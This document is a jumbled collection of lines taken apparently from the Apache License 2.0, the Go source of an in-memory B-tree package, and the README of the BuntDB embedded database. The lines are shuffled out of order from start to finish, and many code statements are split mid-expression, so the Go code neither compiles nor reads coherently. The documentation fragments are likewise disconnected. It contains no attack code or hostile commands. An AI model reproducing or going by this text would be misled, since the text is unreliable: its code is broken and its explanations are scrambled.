      result of this License or out of the use or inability to use the
"      defend, and hold each Contributor harmless for any liability"
      the copyright owner that is granting the License.
          stating that You changed the files
"          attribution notices from the Source form of the Work,"
"      and issue tracking systems that are managed by, or on behalf of, the"
      granted to You under this License for that Work shall terminate
" or,"
"      License. However, in accepting such obligations, You may act only"
      the original version of the Work and any modifications or additions
      replaced with your own identifying information. (Don't include
   3. Grant of Patent License. Subject to the terms and conditions of
"      worldwide, non-exclusive, no-charge, royalty-free, irrevocable"
"      negligent acts) or agreed to in writing, shall any Contributor be"
   Copyright [yyyy] [name of copyright owner]
"      ""Object"" form shall mean any form resulting from mechanical"
      PARTICULAR PURPOSE. You are solely responsible for determining the
   limitations under the License.
      exercising permissions granted by this License.
"      use, offer to sell, sell, import, and otherwise transfer the Work,"
"      boilerplate notice, with the fields enclosed by brackets ""[]"""
"      Notwithstanding the above, nothing herein shall supersede or modify"
"      form, that is based on (or derived from) the Work and for which the"
"      separable from, or merely link (or bind by name) to the interfaces of,"
language: go
// the 'start' should be greater than 'stop'. Setting 'includeStart' to true
"BTree) AscendLessThan(pivot Item, iterator ItemIterator) {"
// We use our special-case 'remove' call with typ=maxItem to pull the
cow2
// and set it into where we pulled the item from.
// clear to allow GC
"//     most likely not stored in contiguous blocks, resulting in a higher"
// Copyright 2014 Google Inc.
// This must provide a strict weak ordering.
// It must at all times maintain the invariant that either
root   
// AscendGreaterOrEqual calls the iterator for every value in the tree within
" len(children) == 0, len(items) unconstrained"
type copyOnWriteContext struct {
default:
 len(t.root.items) == 0 {
return n
t.root = t.root.children[0]
c.stack[len(c.stack)-1].i = i
items) pop() (out Item) {
// Used for testing/debugging purposes.
type stackItem struct {
copyOnWriteContext) newNode() (n 
if i > 0 
if len(n.children) == 0 {
"nilItems    = make(items, 16)"
"// [first, last], until iterator returns false."
// implementation written about there.
"// already equals the given one, it is removed from the tree and returned."
// in sorted order.
//     http://www.apache.org/licenses/LICENSE-2.0
if index < len(
Cursor) First() Item {
// DescendRange calls the iterator for every value in the tree within the range
"// Note, though, that this project is in no way related to the C"
ctx    interface{}
children) truncate(index int) {
"n.items.insertAt(i, item)"
hit = true
// copyOnWriteContext pointers determine node ownership... a tree with a write
f.freelist = f.freelist[:index]
"return NewWithFreeList(degree, NewFreeList(DefaultFreeListSize), ctx)"
n.items[i] = item
// Seek moves the cursor to provided item and returns that item.
type Cursor struct {
case removeItem:
"node) growChildAndRemove(i int, item Item, minItems int, typ toRemove, ctx interface{}) Item {"
// First moves the cursor to the first item in the tree and returns that item.
s)[index
t.root = t.cow.newNode()
// Len returns the number of items currently in the tree.
node) mutableFor(cow 
// If the item does not exist then the next item is returned.
func min(n 
"// tree's context, that node is modifiable in place.  Children of that node may"
"t.root.items = append(t.root.items, item)"
if start != nil 
out.children = out.children[:len(n.children)]
if t.root == nil {
"// split splits the given node at the given index.  The current node shrinks,"
"// The item exists at index 'i', and the child we've selected can give us a"
n.items[i] = stolenItem
" !s[i-1].Less(item, ctx) {"
1].items) > minItems {
} else {
FreeList) newNode() (n 
return c
// You may obtain a copy of the License at
"out.items = make(items, len(n.items), cap(n.items))"
// There is a user-defined ctx argument that is equal to the ctx value which
// min returns the first item in the subtree.
i = len(n.items)
Cursor{t: t}
return true
"//     interface pointing to that value and its type), resulting in higher"
"// predecessor, since if we've gotten here it's got > minItems items in it."
// be returned. You must reposition your cursor after mutating data.
if n == nil {
// and this function returns the item that existed at that index and a new node
return t.degree
BTree) Min() Item {
"child.children = append(child.children, mergeChild.children...)"
// Less tests whether the current item is less than the given argument.
// containing all items/children after it.
//   B) node doesn't have enough values
"if hit, ok = n.children[i].iterate(dir, start, stop, includeStart, hit, iter, ctx)"
degree int
if len(t.root.items) == 0 
"// insert inserts an item into the subtree rooted at this node, making sure"
//   the new b.cow nodes
ascend  = direction(
if len(n.children[i].items) < maxItems {
" n.items[i].Less(start, ctx) {"
"node) iterate(dir direction, start, stop Item, includeStart bool, hit bool, iter ItemIterator, ctx interface{}) (bool, bool) {"
c := n.children[i].mutableFor(n.cow)
// Cursor represents an iterator that can traverse over all items in the tree
"func NewWithFreeList(degree int, f "
node {
case descend:
// unable to find that item.
// is set at time of the btree contruction.
if len(n.children[i].items) <= minItems {
// whenever one of b's original nodes would have been modified.  Read operations
"// BTree has its own FreeList, but multiple BTrees can share the same"
// will initially experience minor slow-downs caused by additional allocs and
stolenItem := stealFrom.items.removeAt(0)
node // current node
"// not share context, but before we descend into them, we'll make a mutable"
"BTree) deleteItem(item Item, typ toRemove, ctx interface{}) Item {"
// AscendRange calls the iterator for every value in the tree within the range
// Package btree implements in-memory B-Trees of arbitrary degree.
c.stack = c.stack[:0]
type toRemove int
"// We do this by, before we descend into any node, creating a copy with the"
if index < 0 {
"return i - 1, true"
"if !item.Less(s[h], ctx) {"
// btree implements an in-memory B-Tree for use as an ordered data structure.
s)[index] = n
"item, second := first.split(maxItems / 2)"
 len(child.items)})
"return n.remove(item, minItems, typ, ctx)"
"toClear = toClear[copy(toClear, nilItems):]"
 !hit 
"FreeList, ctx interface{}) "
"// Max returns the largest item in the tree, or nil if the tree is empty."
// nil cannot be added to the tree (will panic).
n.children.insertAt(i
"if hit, ok = n.children[0].iterate(dir, start, stop, includeStart, hit, iter, ctx)"
out := cow.newNode()
n := c.stack[si].n
// minItems returns the min number of items to allow per node (ignored for the
// list.  'found' is true if the item already exists in the list at the given
if out == nil {
 Due to the overhead of storing values as interfaces (each
return false
-equivalent structures also must store
"child.children = append(child.children, stealFrom.children.removeAt(0))"
} else if i < len(n.items) 
"c.stack = append(c.stack, stackItem{n: n})"
 i >= 0
"nilChildren = make(children, 16)"
"""io"""
// associated Ascend
for len(n.children) > 0 {
// iterate provides a simple method for iterating over elements in the tree.
"// Either we had enough items to begin with, or we've done some"
" !start.Less(n.items[i], ctx) {"
"// [pivot, first], until iterator returns false."
if len(f.freelist) < cap(f.freelist) {
// children stores child nodes in a node.
"t.root.iterate(ascend, nil, pivot, false, false, iterator, t.ctx)"
s) {
node
return new(node)
DefaultFreeListSize = 32
"// If we get to here, we have children."
"// removeAt removes a value at a given index, pulling all subsequent values"
c.freelist.freeNode(n)
var (
type ItemIterator func(i Item) bool
"// merging/stealing, because we've got enough now and we're ready to return"
for len(toClear) > 0 {
Cursor) Prev() Item {
n.items.truncate(i)
return n.items.pop()
"node) get(key Item, ctx interface{}) Item {"
} else if i%2 == 1 {
// hold one of either a or b in the tree).
// Most documentation says we have to do two sets of special casing:
"// We then simply redo our remove call, and the second time (regardless of"
s) - 1
i = 0
n.children.truncate(i 
t.cow.freeNode(oldroot)
//   a) left sibling has node to spare
// Int implements the Item interface for integers.
for i := len(n.items) - 1
"// it.  If no such item exists, returns nil."
return n.items[i]
item := (
"// Get looks for the key item in the tree, returning it.  It returns nil if"
// NewFreeList creates a new free list.
//     memory use.
// Steal from left child
// get finds the given key in the subtree and returns it.
t.length
// stores values in arrays within the node:
"out := t.root.insert(item, t.maxItems(), t.ctx)"
//   the new out.cow nodes
"return hit, true"
// you may not use this file except in compliance with the License.
"// Clone clones the btree, lazily.  Clone should not be called concurrently,"
"// maybeSplitChild checks if a child should be split, and if so splits it."
"""strings"""
// context equivalent to a node's write context is allowed to modify that node.
// but the original tree (t) and the new tree (t2) can be used concurrently
"if n.maybeSplitChild(i, maxItems) {"
// growChildAndRemove grows child 'i' to make sure it's possible to remove an
 function will immediately return.
BTree) minItems() int {
 len(children) == len(items) 
// Cursor returns a new cursor used to traverse over items in the tree.
t.cow = 
BTree) Max() Item {
"if hit, ok = n.children[i"
if cap(out.items) >= len(n.items) {
BTree) Ascend(iterator ItemIterator) {
// DeleteMin removes the smallest item in the tree and returns it.
"return child.remove(item, minItems, typ, ctx)"
if i >= len(n.items) {
"items) insertAt(index int, item Item) {"
removeMin                  // removes smallest item in the subtree
"// In both cases, we need to handle the two subcases:"
copyOnWriteContext) 
// max returns the last item in the subtree.
switch typ {
stolenItem := stealFrom.items.pop()
c.stack[len(c.stack)-1].i = i 
FreeList {
func NewFreeList(size int) 
// should have no performance degredation.  Write operations for both t and t2
"//     value needs to be stored as the value itself, then 2 words for the"
//   1) item is in this node
if i == len(n.children)
freelist 
 B-Tree
BTree) Delete(item Item) Item {
node) Item {
if !iter(n.items[i]) {
s)-1] = nil
return t.Get(key) != nil
return c.Next()
"// BTree stores Item instances in an ordered structure, allowing easy insertion,"
"// the tree.  When this function returns false, iteration will stop and the"
"cow1, cow2 := "
"""fmt"""
n = f.freelist[index]
"copy(out.children, n.children)"
"// the range [pivot, last], until iterator returns false."
if stop != nil 
" Since interfaces can point to values anywhere in memory, values are"
// Write operations are not safe for concurrent mutation by multiple
f.mu.Lock()
if degree <= 1 {
"// [last, first], until iterator returns false."
"return i, false"
"t.root.iterate(descend, lessOrEqual, greaterThan, true, false, iterator, t.ctx)"
"t.root.iterate(descend, nil, nil, false, false, iterator, t.ctx)"
// pop removes and returns the last element in the list.
 len(n.items) - 1})
// FreeList.
case ascend:
//   
n.items.truncate(0)
if t.root == nil 
out = (
s)[index] = item
// find returns the index where the given item should be inserted into this
mergeItem := n.items.removeAt(i)
s = (
"// slice of children.  For basic numeric values or raw structs, this can cause"
index := len(
"func New(degree int, ctx interface{}) "
1:]...)
// truncate truncates this instance at index so that it contains only the
item := n.items[i]
"child.items = append(child.items, n.items[i])"
n.cow = c
if len(t.root.items) >= t.maxItems() {
if len(n.items) == 0 {
cow      
return 
oldroot := t.root
if i == -1 {
i int   // index of the next child/item.
"return t.deleteItem(nil, removeMax, t.ctx)"
n = n.children[0]
return max(t.root)
out := n.items[i]
// maxItems returns the max number of items to allow per node.
"// If a node doesn't have enough items, we make sure it does (using a,b,c)."
items    items
n.cow = nil
if item == nil {
copyOnWriteContext) freeNode(n 
"// heap-allocated structures, since C"
if found {
 i < len(n.items)
// Ascend calls the iterator for every value in the tree within the range
type items []Item
case removeMin:
c.stack[si].i--
"return n.mutableChild(i).insert(item, maxItems, ctx)"
child := n.children[i/2]
// node is an internal node in a tree.
"case item.Less(inTree, ctx):"
"// goroutines, but Read operations are."
"i, found := n.items.find(item, ctx)"
// Create two entirely new copy-on-write contexts.
"// no change, we want first split node"
"// the range (pivot, last], until iterator returns false."
// NewWithFreeList creates a new B-Tree that uses the given node free list.
// predecessor of item i (the rightmost leaf of our immediate left child)
// AscendLessThan calls the iterator for every value in the tree within the range
"fmt.Fprintf(w, ""%sNODE:%v"
"BTree) DescendGreaterThan(pivot Item, iterator ItemIterator) {"
"next.children = append(next.children, n.children[i"
type node struct {
"func (s items) find(item Item, ctx interface{}) (index int, found bool) {"
// A tree whose write context does not match a node's is not allowed to modify
copy((
// stuff.
"// Its functions, therefore, exactly mirror those of"
func max(n 
n.cow.freeNode(mergeChild)
// correct context if the contexts don't match.
type direction int
"s)[index:], ("
"c.print(w, level"
const (
// Prev moves the cursor to the previous item and returns that item.
if n.cow == c {
f.freelist[index] = nil
"c.stack = append(c.stack, stackItem{n: n, i: len(n.children) "
" start.Less(n.items[i], ctx) {"
package btree
"panic(""invalid type"")"
n.items[i-1] = stolenItem
s)[index:]
" !stop.Less(n.items[i], ctx) {"
"c.stack = append(c.stack, stackItem{n: n.children[i/2], i: -1})"
// Copy children
BTree
func (n 
"item2, second := t.root.split(t.maxItems() / 2)"
n.children.truncate(0)
BTree) Clone() (t2 
// ReplaceOrInsert adds the given item to the tree.  If an item in the tree
BTree {
stack []stackItem
BTree) maxItems() int {
"// llrb.LLRB where possible.  Unlike gollrb, though, we currently don't"
} else if len(n.children) > 0 {
"return item, next"
return n.items[0]
return n.items[len(n.items)-1]
type BTree struct {
n := c.t.root
"// When doing any write operation, we maintain the invariant that the current"
// It is not meant for persistent storage solutions.
 !ok {
"node) insert(item Item, maxItems int, ctx interface{}) Item {"
 template code that
"// These issues don't tend to matter, though, when working with strings or other"
items) removeAt(index int) Item {
"return n.growChildAndRemove(i, item, minItems, typ, ctx)"
s)[len(
"// [lessOrEqual, greaterThan), until iterator returns false."
BTree) DeleteMin() Item {
2 the same:
"child.items = append(child.items, mergeItem)"
out := 
// New creates a new B-Tree with the given degree.
"1, second)"
"BTree) DescendRange(lessOrEqual, greaterThan Item, iterator ItemIterator) {"
// first index items. index must be less than or equal to length.
 to iterate in-order over portions of
stealFrom := n.mutableChild(i 
"// When ascending, the 'start' should be less than 'stop' and when descending,"
return a < b.(Int)
" !b.Less(a), we treat this to mean a == b (i.e. we can only"
i: len(child.children) 
// support storing multiple equivalent values.
"i, found = n.items.find(item, ctx)"
len(n.items) {
"degree: degree,"
var found bool
case removeMax:
"// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
n = n.children[len(n.children)-1]
Cursor) Seek(pivot Item) Item {
"// be found/replaced by insert, it will be returned."
// size is the maximum size of the returned free list.
// back.
"child.items = append(child.items, mergeChild.items...)"
"t.root.items = append(t.root.items, item2)"
// node's context is equal to the context of the tree that requested the write.
"1:], ("
"// If no such item exists, returns nil."
"ctx:    ctx,"
if n.cow == cow {
t.root = t.root.mutableFor(t.cow)
return t.degree - 1
type FreeList struct {
"copyOnWriteContext{freelist: f},"
s)[index]
// copy.
// If !a.Less(b) 
"s, toClear = ("
"t.root.children = append(t.root.children, oldroot, second)"
"case inTree.Less(item, ctx):"
"// copies due to the aforementioned copy-on-write logic, but should converge to"
"// It has a flatter structure than an equivalent red-black or other binary tree,"
var i int
return n.items.removeAt(0)
// Next moves the cursor to the next item and returns that item.
// limitations under the License.
"// it, and must create a new, writable copy (IE: it's a Clone)."
"t.root.iterate(descend, nil, pivot, false, false, iterator, t.ctx)"
cow1
return c.Prev()
j = h
stealFrom := n.mutableChild(i - 1)
s)[:index]
// toRemove details what item to remove in a node.remove call.
"return hit, false //"
return min(t.root)
2 - 1
for i < j {
"out.children = make(children, len(n.children), cap(n.children))"
"// For the latter, we have to check:"
return n.items[i/2]
mergeChild := n.children.removeAt(i 
// Returns whether or not a split occurred.
s)[:len(
FreeList{freelist: make([]
t.length--
"node) remove(item Item, minItems int, typ toRemove, ctx interface{}) Item {"
// DescendGreaterThan calls the iterator for every value in the tree within
BTree) Len() int {
Cursor {
if cap(out.children) >= len(n.children) {
"child.children.insertAt(0, stealFrom.children.pop())"
 i-- {
children) removeAt(index int) 
"return n.children[i].get(key, ctx)"
h := i 
if out != nil {
"node) split(i int) (Item, "
"// Licensed under the Apache License, Version 2.0 (the ""License"")"
cow    
items) truncate(index int) {
func (f 
switch {
 start != nil 
"t.cow, "
if len(stealFrom.children) > 0 {
// FreeList represents a free list of btree nodes. By default each
// See some discussion on the matter here:
// forward.
"// Final recursive call.  Once we're here, we know that the item isn't in this"
BTree) Descend(iterator ItemIterator) {
"child.items.insertAt(0, n.items[i-1])"
// Less returns true if int(a) < int(b).
// DescendLessOrEqual calls the iterator for every value in the tree within the range
return item
var ok bool
mu       sync.Mutex
// See the License for the specific language governing permissions and
"children) insertAt(index int, n "
"// trees, (http://github.com/petar/gollrb), an excellent and probably the most"
out.items = out.items[:len(n.items)]
"""sync"""
func (s 
// root node).
type Int int
"panic(""bad degree"")"
// DeleteMax removes the largest item in the tree and returns it.
index := len(f.freelist) - 1
n.children[i] = c
t.cow
"// Min returns the smallest item in the tree, or nil if the tree is empty."
"panic(""nil item being added to BTree"")"
s = append(
i := c.stack[si].i
// ItemIterator allows callers of Ascend
"next.items = append(next.items, n.items[i"
node) mutableChild(i int) 
"//   the original, shared nodes (old b.cow)"
// the original performance characteristics of the original tree.
"// item from it while keeping it at minItems, then calls remove to actually"
"// Within this tree, each node contains a slice of items and a (possibly nil)"
// efficiency differences when compared to equivalent C
"copy(out.items, n.items)"
//   b) right sibling has node to spare
descend = direction(-1)
 len(t.root.children) > 0 {
 (j-i)/2
Cursor) Last() Item {
s)-1]
"// To simplify our code here, we handle cases "
// first index children. index must be less than or equal to length.
"return t.deleteItem(item, removeItem, t.ctx)"
BTree) Get(key Item) Item {
return nil
"// [first, pivot), until iterator returns false."
 len(n.children[i
func (t 
"// will force the iterator to include the first item when it equals 'start',"
"// removal, and iteration."
BTree) ReplaceOrInsert(item Item) Item {
cow:    
// The internal tree structure of b is marked read-only and shared between t and
"// insertAt inserts a value into the given index, pushing all subsequent values"
"// ""greaterThan"" or ""lessThan"" queries."
BTree) Cursor() 
"return t.deleteItem(nil, removeMin, t.ctx)"
"f.freelist = append(f.freelist, n)"
"t.root.iterate(ascend, pivot, nil, true, false, iterator, t.ctx)"
"node) maybeSplitChild(i, maxItems int) bool {"
// pointers and also distribute their values across the heap.
s)[index:])
children children
//   A) node has enough values that it can spare one
 // we want second split node
// once the Clone call completes.
"BTree) AscendRange(greaterOrEqual, lessThan Item, iterator ItemIterator) {"
"node, 0, size)}"
first := n.mutableChild(i)
si := len(c.stack) - 1
"return t.root.get(key, t.ctx)"
"toClear = toClear[copy(toClear, nilChildren):]"
return t.length
1:])
// steal from right child
i = h 
"n.items[i] = child.remove(nil, minItems, removeMax, ctx)"
if len(n.children) > 0 {
"i, j := 0, len(s)"
// Since the node we're currently visiting on any write has the requesting
children) pop() (out 
continue
// This implementation is designed to be a drop-in replacement to gollrb.LLRB
"// Unless required by applicable law or agreed to in writing, software"
//     number of cache misses.
// remove it.
return n.items.removeAt(i)
switch dir {
"node) print(w io.Writer, level int) {"
if i == len(n.items) {
"t.root.iterate(descend, pivot, nil, true, false, iterator, t.ctx)"
node) {
s)[index] = nil
"i, found := n.items.find(key, ctx)"
"out := t.root.remove(item, t.minItems(), typ, ctx)"
for n != nil {
return out
" !n.items[i].Less(start, ctx) {"
// Two Btrees using the same freelist are safe for concurrent write access.
var toClear items
// Item represents a single object in the tree.
"c.stack = append(c.stack, stackItem{n: child,"
BTree) DeleteMax() Item {
// index.
// items stores items in a node.
// and 2-4 children).
// that we hit case A.
inTree := n.items[i]
//   http://google-opensource.blogspot.com/2013/01/c-containers-that-save-memory-and-time.html
if !includeStart 
import (
"// Delete removes an item equal to the passed in item from the tree, returning"
copyOnWriteContext
"// [greaterOrEqual, lessThan), until iterator returns false."
// no nodes in the subtree exceed maxItems items.  Should an equivalent item be
removeMax                  // removes largest item in the subtree
type children []
"1].iterate(dir, start, stop, includeStart, hit, iter, ctx)"
length int
//   c) we must merge
// merge with right child
"i, found := n.items.find(pivot, c.t.ctx)"
"return hit, false"
for i := 0
"// thus creating a ""greaterOrEqual"" or ""lessThanEqual"" rather than just a"
func (c 
BTree) Has(key Item) bool {
"// whether we're in case 1 or 2), we'll have enough items and can guarantee"
"BTree) DescendLessOrEqual(pivot Item, iterator ItemIterator) {"
// which in some cases yields better memory usage and/or performance.
n := (
child := n.mutableChild(i)
BTree) {
n = c.freelist.newNode()
"// t2.  Writes to both t and t2 use copy-on-write logic, creating new nodes"
if len(c.stack) == 0 {
BTree{
// node and that the child is big enough to remove from.
"t.root.iterate(ascend, nil, nil, false, false, iterator, t.ctx)"
// Changing data while traversing a cursor may result in unexpected items to
c.stack[si].i
" !n.items[i].Less(stop, ctx) {"
var toClear children
FreeList
type Item interface {
f.mu.Unlock()
FreeList) freeNode(n 
 len(n.children[i-1].items) > minItems {
"s, nil)"
t     
// Last moves the cursor to the last item in the tree and returns that item.
"func (a Int) Less(b Item, ctx interface{}) bool {"
Cursor) Next() Item {
//   2) item is in child
c.stack = c.stack[:len(c.stack)-1]
n = n.children[i]
 hit 
"// Otherwise, nil is returned."
"t.root.iterate(ascend, greaterOrEqual, lessThan, true, false, iterator, t.ctx)"
// remove removes an item from the subtree rooted at this node.
// Has returns true if the given key is in the tree.
"// distributed under the License is distributed on an ""AS IS"" BASIS,"
1 and 
// Descend calls the iterator for every value in the tree within the range
freelist []
next := n.cow.newNode()
removeItem toRemove = iota // removes the given item
"Less(than Item, ctx interface{}) bool"
"// New(2), for example, will create a 2-3-4 tree (each node contains 1-3 items"
"BTree) AscendGreaterOrEqual(pivot Item, iterator ItemIterator) {"
"if hit, ok = n.children[len(n.children)-1].iterate(dir, start, stop, includeStart, hit, iter, ctx)"
"n"", strings.Repeat(""  "", level), n.items)"
return
out.cow = 
"s)[:index], ("
// widely used ordered tree implementation in the Go ecosystem currently.
// BTree is an implementation of a B-Tree.
// This operation effectively creates three trees:
"for _, c := range n.children {"
"tx.Set(""user:4:age"", ""63"", nil)"
" adjusts how often the data is synced to disk. This value can be Never, EverySecond, or Always. Default is EverySecond."
Getting non-existent values will cause an 
"tx.Set(""user:6:age"", ""3"", nil)"
"3: {""name"":{""first"":""Carol"",""last"":""Anderson""},""age"":52}"
[3 9 1]
DescendLessOrEqual
", there is also "
user:6:name peter
A read-only transaction should be used when you don't need to make changes to the data. The advantage of a read-only transaction is that there can be many running concurrently.
There is also a 
 function on the index:
. To open or create your
if someCondition(k) == true {
speed over data size.
. Please see the [documentation](https://godoc.org/github.com/tidwall/buntdb) for more information on these functions.
Nearby
SetOptions
 Similar to a SQL multi column index
"tx.Set(""6"", "
" - fsync every second, fast and safer, this is the default"
"To start using BuntDB, install Go and run "
" will automatically be deleted after one second. You can remove the TTL by setting the value again with the same key/value, but with the options parameter set to nil."
"{""age"":50}"
 will be added to the 
ASCEND_800: 348445.55 operations per second
fsync
"err := tx.Ascend("""", func(key, value string) bool {"
"When the database opens again, it will read back the aof file and process each command in exact order."
Which will return:
"{""name"":{""first"":""Sam"",""last"":""Anderson""},""age"":51}"
"tx.Set(""user:1:name"", ""Randi"", nil)"
With BuntDB it's possible to join multiple values on a single index.
 JSON Indexes
- In-memory database for [fast reads and writes](
Never
"db.CreateIndex(""names"", ""user:"
 Custom Indexes
 function to get all the positions in order of nearest to farthest :
func main() {
"1: {""name"":{""first"":""Tom"",""last"":""Johnson""},""age"":38}"
return true
 function which will rewrite the aof file so that it contains only the items in the database.
transactions) that support rollbacks
DESCEND_200: 1292738.38 operations per second
There's also support for Collation on JSON indexes:
Any index can be put in descending order by wrapping it's less function with 
defer db.Close()
"""log"""
user:0:age 35
[-112.2693 33.5123]
 err != nil{
"buntdb.IndexJSON(""name.last""),"
user:5:age 8
"These are the results from running the benchmarks on a MacBook Pro 15"" 2.8 GHz Intel Core i7:"
Order by last name
"import ""github.com/tidwall/collate"""
SPATIAL_INTERSECTS_800: 159673.91 operations per second
Finally you can iterate over the index:
- Support for [multi value indexes](
"tx.Set(""4"", "
ASCEND_200: 1178388.14 operations per second
"tx.Set(""user:0:name"", ""tom"", nil)"
"- Tight codebase, under 2K loc using the "
- [Durable append-only file](
Order by age range 30-50
Here are some example [benchmarks](https://github.com/tidwall/raft-buntdb
 Append-only File
The format of this file looks like:
 has the following options:
 License
Delete()
custom-indexes) for any data type
 where XY is a point and M is a timestamp):
BuntDB source code is available under the MIT [License](/LICENSE).
:memory:
 k-Nearest Neighbors
You can also represent 
"{""name"":{""first"":""Janet"",""last"":""Prichard""},""age"":47}"
SPATIAL_INTERSECTS_200: 561590.40 operations per second
All keys/value pairs are ordered in the database by the key. To iterate over the keys:
"iterating) over values. A custom index also uses a B-tree, but it's more flexible because it allows for custom ordering."
 function to set a 
go test --bench=.
You can also run the standard Go benchmark tool from the project root directory:
There's a [custom utility](https://github.com/tidwall/buntdb-benchmark) that was created specifically for benchmarking BuntDB.
 Useful for Geospatial data
AutoShrinkPercentage
"buntdb.Desc(buntdb.IndexJSON(""age"")))"
user:5:name Paula
set key:1 value1
data. It's ideal for projects that need a dependable database and favor
" object, which represents the transaction state. While inside a transaction, all database operations should be performed using this object. You should never access the origin "
And then you can run the 
"4: {""name"":{""first"":""Alan"",""last"":""Cooper""},""age"":28}"
if err := db.WriteConfig(config)
Results:
===============
There's a background routine that automatically shrinks the log file when it gets too large.
DescendGreaterThan
Notice:
return true // continue
user:2:age 13
"XY: ""10x15"""
"database, use the "
"for _, k := range delkeys {"
"tx.Ascend(""age"", func(key, value string) bool {"
"2: {""name"":{""first"":""Janet"",""last"":""Prichard""},""age"":47}"
[5 7 5]
AscendRange
"BuntDB has support for spatial indexes by storing rectangles in an [R-tree](https://en.wikipedia.org/wiki/R-tree). An R-tree is organized in a similar manner as a [B-tree](https://en.wikipedia.org/wiki/B-tree), and both are balanced trees. But, an R-tree is special because it can operate on data that is in multiple dimensions. This is super handy for Geospatial applications."
DESCEND_800: 337481.67 operations per second
Now 
AutoShrinkMinSize
SPATIAL_SET: 134824.60 operations per second
"buntdb.Open("":memory:"") // Open a file that does not persist to disk."
" String, Uint, Int, Float"
As a workaround you'll need to delete keys following the completion of the iterator.
go get -u github.com/tidwall/collate
iterating) over the keys. Feel free to peruse the [B-tree implementation](https://github.com/tidwall/btree).
IndexString
 as the path of the file.
[4 7 4]
go get github.com/tidwall/buntdb-benchmark
"{""name"":{""first"":""Alan"",""last"":""Cooper""},""age"":28}"
user:1:age 49
CreateSpatialIndex
- [Built-in types](
"_, _, err := tx.Set(""mykey"", ""myvalue"", nil)"
Then 
buntdb.Tx) error {
var delkeys []string
AscendGreaterOrEqual
 is a built-in function that performs case-insensitive ordering on the values
DESCEND_400: 675258.76 operations per second
var config buntdb.Config
"fmt.Println(""Order by age range 30-50"")"
 index:
"tx.Set(""mykey"", ""myval"", "
user:6:age 3
- [Spatial indexing](
performance)
user:4:name Janet
if err != nil {
"[10 15],[20 25]"
"""fmt"""
", and "
"So to create an index that is numerically ordered on an age key, we could use:"
 Descending Ordered Index
"tx.Set(""user:6:name"", ""peter"", nil)"
As you may guess this log file can grow large over time.
"tx.AscendRange(""age"", "
" The longitude is the Y axis and is on the left, and latitude is the X axis and is on the right."
You can then do a search for all points with 
"db.CreateIndex(""last_name"", """
$ buntdb-benchmark -q
 Built-in types
 Spatial bracket syntax
This will create an index named 
"if _, err = tx.Delete(k)"
"inf 4]"", func(key, val string) bool {"
To update the configuration you should call 
<img
"tx.Ascend(""last_name_age"", func(key, value string) bool {"
"tx.Nearby(""fleet"", ""[-113 33]"", func(key, val string, dist float64) bool {"
"tx.Set(""user:0:age"", ""35"", nil)"
"tx.AscendKeys(""object:"
"{""age"":30}"
Here are some configuration options that can be use to change various behaviors of the database.
spatial-indexes) for up to 20 dimensions
" - fsync after every write, very durable, slower"
- Flexible [iteration](
 Setting and getting key/values
Check out the [collate project](https://github.com/tidwall/collate) for more information.
config)
"<a href=""https://godoc.org/github.com/tidwall/buntdb""><img src=""https://img.shields.io/badge/api-reference-blue.svg"
DescendRange
 index.
"fmt.Printf(""value is %s"
"fmt.Println(""Order by age"")"
From there on the file is only appended.
"style=flat-square"" alt=""Code Coverage""></a>"
readers and a single writer. It supports custom indexes and geospatial
 and 
Always
""", func(k, v string) bool {"
Descend
This will create a multi value index where the last name is ascending and the age is descending.
"tx.Set(""user:4:name"", ""Janet"", nil)"
"tx.Set(""user:5:name"", ""Paula"", nil)"
""", buntdb.IndexJSON(""age""))"
""", buntdb.IndexJSON(""name.last""))"
The primary object in BuntDB is a 
The shrink operation does not lock up the database so read and write transactions can continue while shrinking is in process.
 error.
The pattern parameter can be used to filter on keys like this:
// Open the data.db file. It will be created if it doesn't exist.
SyncPolicy
2D point:
"fmt.Printf(""key: %s, value: %s"
db.View(func(tx 
 BuntDB-Benchmark
"tx.Set(""user:5:age"", ""8"", nil)"
"Min XY: ""10x15"", Max XY: ""20x25"""
Intersects
 Performance
DESCEND_100: 2313821.69 operations per second
""", buntdb.IndexString)"
" is unique to BuntDB, and it's how the built-in rectangles are processed. But, you are not limited to this syntax. Whatever Rect function you choose to use during "
"db.CreateIndex(""age"", """
"It persists to disk, is ACID compliant, and uses locking for multiple"
Shrink()
if err != nil{
collate-i18n-indexes) using the optional [collate package](https://github.com/tidwall/collate)
And then add values:
"tx.Ascend(""last_name"", func(key, value string) bool {"
"tx.Set(""5"", "
This read process happens one time when the database opens.
ASCEND_400: 679134.20 operations per second
"db.CreateIndex(""name"", """
Items can be automatically evicted by using the 
 running
"style=flat-square"" alt=""Go Report Card""></a>"
"tx.Intersects(""fleet"", ""[-117 30],[-112 36]"", func(key, val string) bool {"
The 
"tx.Set(""3"", "
 wildcard argument means that we want to accept all keys. 
"db, _ := buntdb.Open("":memory:"")"
 Opening a database
raftstore-performance-comparison) when using BuntDB in a Raft Store implementation.
":pos"", buntdb.IndexRect)"
" ascending, descending, and ranges"
":age"", buntdb.IndexInt)"
BuntDB uses an AOF (append-only file) which is a log of all database changes that occur from operations like 
"// 6: {""name"":{""first"":""Melinda"",""last"":""Prichard""},""age"":44}"
You can also create custom indexes that allow for ordering and [iterating](
"n"", key, val)"
"    width=""307"" height=""150"" border=""0"" alt=""BuntDB"">"
</p>
<br>
"db.CreateSpatialIndex(""fleet"", ""fleet:"
[5 6 6]
The bracket syntax 
"tx.Set(""fleet:1:pos"", ""[-116.671 35.735]"", nil)"
 err != nil {
""", collate.IndexJSON(""CHINESE_CI"", ""name.last""))"
return err
"{""name"":{""first"":""Carol"",""last"":""Anderson""},""age"":52}"
Use the 
This will retrieve the library.
"tx.Set(""2"", "
"db.CreateIndex(""ages"", ""user:"
cloc
"delkeys = append(delkeys, k)"
This will get all three positions.
"tx.Set(""user:7:age"", ""16"", nil)"
[4 8 3]
"<a href=""http://gocover.io/github.com/tidwall/buntdb""><img src=""https://img.shields.io/badge/coverage-95%25-brightgreen.svg"
 Transactions
"tx.Set(""user:2:age"", ""13"", nil)"
BuntDB does not currently support deleting a key while in the process of iterating.
" object while inside a transaction. Doing so may have side-effects, such as blocking your application."
The output should be:
Getting Started
db.Update(func(tx 
 Multi Value Index
 Collate i18n Indexes
"{""name"":{""first"":""Tom"",""last"":""Johnson""},""age"":38}"
 Config
names
Transactions run in a function that exposes a 
append-only-file). Which simply means that there's a chance that up to one second of data might be lost. If you need higher durability then there's an optional database config setting 
"""github.com/tidwall/buntdb"""
[X Y M]
"tx.Set(""user:7:name"", ""Terri"", nil)"
 Installing
